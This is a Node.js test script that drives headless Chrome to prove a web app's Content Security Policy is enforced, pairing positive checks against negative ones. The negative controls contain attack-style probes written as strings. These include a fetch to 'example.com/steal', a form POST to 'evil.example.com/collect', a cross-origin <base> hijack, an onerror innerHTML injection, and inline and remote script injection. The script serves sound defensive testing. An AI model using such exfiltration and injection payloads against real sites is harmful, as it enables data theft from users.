// Proves the Content Security Policy is enforced in a real browser.
//
// A policy that parses is not a policy that works. This tool loads the built bundle in
// headless Chrome and, for each control that matters, attempts the thing the policy is
// supposed to prevent and asserts that it actually failed. Checks are paired: positive
// controls prove the application still functions, negative controls prove the
// restrictions are real rather than merely declared.
//
// Modelled on docs/phase-0/BROWSER-CORS-PROOF.md, which established that a security claim
// about browser behaviour has to be demonstrated in a browser.
//
//   node tools/csp-test.mjs dist/depguard/browser
import http from 'node:http';
import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import { spawn } from 'node:child_process';
import { chromeArguments, findChrome } from './chrome.mjs';

const DIST = path.resolve(process.argv[2] ?? 'dist/depguard/browser');
const PORT = 8098;
const DEBUG_PORT = 9226;
const types = {
  '.html': 'text/html',
  '.js': 'text/javascript',
  '.css': 'text/css',
  '.ico': 'image/x-icon',
};

// Serves the bundle with no security headers of its own, so everything observed is
// attributable to the meta-tag policy in index.html - which is all GitHub Pages can
// deliver.
const server = http.createServer((req, res) => {
  let rel = decodeURIComponent(req.url.split('?')[0]);
  rel = rel.startsWith('/depguard/') ? rel.slice('/depguard/'.length) : rel.slice(1);
  if (rel === '') rel = 'index.html';
  const file = path.join(DIST, rel);
  if (!file.startsWith(DIST) || !fs.existsSync(file)) {
    res.writeHead(404);
    res.end('not found');
    return;
  }
  res.writeHead(200, { 'Content-Type': types[path.extname(file)] ?? 'application/octet-stream' });
  res.end(fs.readFileSync(file));
});
await new Promise((r) => server.listen(PORT, '127.0.0.1', r));

const profile = fs.mkdtempSync(path.join(os.tmpdir(), 'dg-csp-'));
const binary = findChrome();

// Chrome's own output is captured rather than discarded. When this failed on a CI runner
// the only message was "could not reach Chrome", which says nothing about why — a missing
// shared library, a sandbox refusal and a slow start all look identical from outside.
const chromeOutput = [];
const chrome = spawn(binary, chromeArguments(DEBUG_PORT, ['--user-data-dir=' + profile]), {
  stdio: ['ignore', 'pipe', 'pipe'],
});
chrome.stdout?.on('data', (chunk) => chromeOutput.push(String(chunk)));
chrome.stderr?.on('data', (chunk) => chromeOutput.push(String(chunk)));
let chromeExit = null;
chrome.on('exit', (code, signal) => {
  chromeExit = `exited with code ${code}${signal ? ` (signal ${signal})` : ''}`;
});

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

// 30 seconds, not 10. A CI runner starts Chrome a great deal more slowly than a
// development machine, and the first attempt at this budget was simply too tight: the
// same command passed in one job and timed out in another on the same commit.
let target = null;
for (let i = 0; i < 60 && !target; i++) {
  await sleep(500);
  if (chromeExit !== null) {
    break;
  }
  try {
    const r = await fetch(`http://127.0.0.1:${DEBUG_PORT}/json/new?url=about:blank`, {
      method: 'PUT',
    });
    if (r.ok) target = await r.json();
  } catch {}
}
if (!target) {
  console.error(`could not reach Chrome on port ${DEBUG_PORT} within 30 seconds`);
  console.error(`  binary: ${binary}`);
  if (chromeExit !== null) console.error(`  process: ${chromeExit}`);
  const output = chromeOutput.join('').trim();
  console.error(output.length > 0 ? `  output:\n${output}` : '  output: (none)');
  chrome.kill();
  process.exit(1);
}

const ws = new WebSocket(target.webSocketDebuggerUrl);
await new Promise((r) => ws.addEventListener('open', r, { once: true }));
let id = 0;
const pend = new Map();
const violations = [];
ws.addEventListener('message', (e) => {
  const m = JSON.parse(e.data);
  if (m.method === 'Log.entryAdded' && /Content Security Policy/i.test(m.params.entry.text)) {
    violations.push(m.params.entry.text);
  }
  if (m.id && pend.has(m.id)) {
    pend.get(m.id)(m);
    pend.delete(m.id);
  }
});
const send = (method, params = {}) =>
  new Promise((res) => {
    const i = ++id;
    pend.set(i, res);
    ws.send(JSON.stringify({ id: i, method, params }));
  });
const ev = async (expr) =>
  (
    await send('Runtime.evaluate', {
      expression: expr,
      returnByValue: true,
      awaitPromise: true,
    })
  ).result?.result?.value;

await send('Runtime.enable');
await send('Log.enable');
await send('Page.enable');
await send('Page.navigate', { url: `http://127.0.0.1:${PORT}/depguard/` });

// Wait for the application to mount, rather than for a fixed number of milliseconds. A
// CI runner is slower and more variable than a development machine, and a sleep long
// enough to be safe there is a sleep wasted on every local run. Polling the condition is
// both faster and not flaky.
let mounted = false;
for (let attempt = 0; attempt < 60 && !mounted; attempt++) {
  await sleep(250);
  mounted = (await ev('!!document.querySelector("dg-root .shell")')) === true;
}
if (!mounted) {
  console.error('The application did not mount within 15 seconds; aborting.');
  console.error('Violations reported so far:');
  for (const violation of [...new Set(violations)]) {
    console.error('  ' + violation.replace(/\s+/g, ' ').slice(0, 200));
  }
  process.exit(1);
}

const results = [];
const check = (name, pass, detail) => {
  results.push({ name, pass, detail });
  console.log(`${pass ? 'PASS' : 'FAIL'}  ${name}${detail ? '  - ' + detail : ''}`);
};

console.log('=== Policy delivery ===');
const policy = await ev(
  'document.querySelector(\'meta[http-equiv="Content-Security-Policy"]\')?.content ?? ""',
);
check('a policy is present in the document', policy.length > 0);
for (const directive of [
  "default-src 'none'",
  "script-src 'self'",
  "object-src 'none'",
  "base-uri 'self'",
  "form-action 'none'",
  "require-trusted-types-for 'script'",
]) {
  check(`declares ${directive}`, policy.includes(directive));
}
check(
  "script-src grants neither 'unsafe-inline' nor 'unsafe-eval'",
  !/script-src[^;]*unsafe-(inline|eval)/.test(policy),
  'scripts stay restricted to bundled files',
);
for (const host of [
  'https://api.github.com',
  'https://raw.githubusercontent.com',
  'https://api.osv.dev',
]) {
  check(`connect-src allows ${host}`, policy.includes(host));
}

console.log('');
console.log('=== Positive controls: the application still works ===');
check('the application mounted', (await ev('!!document.querySelector("dg-root .shell")')) === true);
check(
  'bundled stylesheet applied',
  (await ev('getComputedStyle(document.body).backgroundColor')) === 'rgb(11, 17, 32)',
);
check(
  'design tokens resolved',
  (await ev('getComputedStyle(document.documentElement).getPropertyValue("--color-accent").trim()'))
    .length > 0,
);

console.log('');
console.log('=== Negative controls: the policy actually blocks ===');

// 1. Trusted Types must reject a string assigned to a script sink. This fires before
//    script-src gets a chance, which is the point of defence in depth.
const ttScriptSink = await ev(
  '(() => { try {' +
    " const s = document.createElement('script');" +
    " s.textContent = 'window.__dgInlineRan = true;';" +
    " return 'assigned';" +
    " } catch (e) { return 'threw: ' + e.name; } })()",
);
check(
  'Trusted Types rejects a string assigned to a script element',
  String(ttScriptSink).startsWith('threw'),
  ttScriptSink,
);

// 2. Inline script must not execute even by a route Trusted Types does not guard.
//    appendChild of a text node is not a Trusted Types sink, so this isolates script-src.
const inlineScript = await ev(
  '(() => { try { window.__dgInlineRan = false;' +
    " const s = document.createElement('script');" +
    " s.appendChild(document.createTextNode('window.__dgInlineRan = true;'));" +
    ' document.head.appendChild(s);' +
    " return window.__dgInlineRan === true ? 'executed' : 'blocked';" +
    " } catch (e) { return 'threw: ' + e.name; } })()",
);
check(
  "an injected inline script does not execute (script-src 'self')",
  inlineScript !== 'executed',
  inlineScript,
);

// 3. eval. This cannot be demonstrated from here, and saying so is better than
//    reporting a result that does not mean what it appears to mean.
//
//    Chrome exempts DevTools Protocol evaluation from the page's CSP by design, so
//    `eval('1+1')` issued over CDP succeeds no matter what the policy says. It is not
//    evidence that page script could call eval. What *is* evidence: the policy grants no
//    'unsafe-eval' (asserted above against the delivered policy text), and the shipped
//    bundle contains no eval call site at all (asserted below against the built file).
const bundle = fs
  .readdirSync(DIST)
  .filter((f) => f.endsWith('.js'))
  .map((f) => fs.readFileSync(path.join(DIST, f), 'utf8'))
  .join('\n');
check(
  'the shipped bundle contains no direct eval call',
  !/[^.\w]eval\s*\(/.test(bundle),
  'static check of the built JavaScript',
);
check(
  'the shipped bundle constructs no function from a string',
  !/new\s+Function\s*\(/.test(bundle),
  'Angular is AOT-compiled, so the JIT compiler is absent',
);

// 3. A script from an unapproved origin must be refused.
const remoteScript = await ev(
  '(() => new Promise((resolve) => {' +
    " const s = document.createElement('script');" +
    " s.src = 'https://cdn.jsdelivr.net/npm/left-pad@1.3.0/index.js';" +
    " s.onload = () => resolve('loaded');" +
    " s.onerror = () => resolve('blocked');" +
    ' document.head.appendChild(s);' +
    " setTimeout(() => resolve('timeout'), 4000); }))()",
);
check(
  'a script from an unapproved CDN is refused',
  String(remoteScript) !== 'loaded',
  typeof remoteScript === 'string' ? remoteScript : 'blocked',
);

// 4. A network call to an unapproved origin must be refused. This is the control that
//    matters most: it is what prevents exfiltration even if markup injection succeeded.
const exfil = await ev(
  "(() => fetch('https://example.com/steal', { mode: 'no-cors' })" +
    " .then(() => 'allowed').catch((e) => 'blocked: ' + e.name))()",
);
check('a fetch to an unapproved origin is refused', !String(exfil).startsWith('allowed'), exfil);

// 5. An approved origin must still be reachable, or the application cannot function.
//    /rate_limit is used because it costs no API quota.
const approved = await ev(
  "(() => fetch('https://api.github.com/rate_limit')" +
    " .then((r) => 'status ' + r.status).catch((e) => 'blocked: ' + e.name))()",
);
check('an approved origin is still reachable', String(approved).startsWith('status'), approved);

// 6. Trusted Types must make innerHTML a hard error for an unpolicied string.
const trustedTypes = await ev(
  '(() => { try { const d = document.createElement("div");' +
    ' d.innerHTML = "<img src=x onerror=1>";' +
    " return d.innerHTML.length > 0 ? 'assigned' : 'empty';" +
    " } catch (e) { return 'threw: ' + e.name; } })()",
);
check(
  'assigning a raw string to innerHTML throws under Trusted Types',
  String(trustedTypes).startsWith('threw'),
  trustedTypes,
);

// 7. A <base> pointing at another origin must be refused.
const baseHijack = await ev(
  "(() => { const b = document.createElement('base');" +
    " b.href = 'https://evil.example.com/';" +
    ' document.head.appendChild(b);' +
    " const applied = document.baseURI.startsWith('https://evil.example.com');" +
    " b.remove(); return applied ? 'repointed' : 'refused'; })()",
);
check('a cross-origin <base> injection is refused', baseHijack === 'refused', baseHijack);

// 8. Form submission to another origin must be blocked.
const formAction = await ev(
  '(() => { try { const f = document.createElement("form");' +
    ' f.method = "POST"; f.action = "https://evil.example.com/collect";' +
    " document.body.appendChild(f); f.submit(); return 'submitted';" +
    " } catch (e) { return 'threw: ' + e.name; } })()",
);
await sleep(600);
const stillHere = await ev('location.hostname');
check(
  "form submission to another origin is blocked by form-action 'none'",
  stillHere === '127.0.0.1',
  `${formAction}; still on ${stillHere}`,
);

console.log('');
console.log('=== Violations reported by the browser ===');
if (violations.length === 0) {
  console.log('  (none)');
} else {
  for (const v of [...new Set(violations)]) {
    console.log('  ' + v.replace(/\s+/g, ' ').slice(0, 170));
  }
}

const failed = results.filter((r) => !r.pass);
console.log('');
console.log(`${results.length - failed.length}/${results.length} checks passed.`);

ws.close();
chrome.kill();
server.close();
try {
  // Chrome holds its crash-reporter file briefly after exit on Windows; a profile left
  // in the temp directory must not fail the security check.
  fs.rmSync(profile, { recursive: true, force: true, maxRetries: 5, retryDelay: 200 });
} catch {}
process.exit(failed.length === 0 ? 0 : 1);
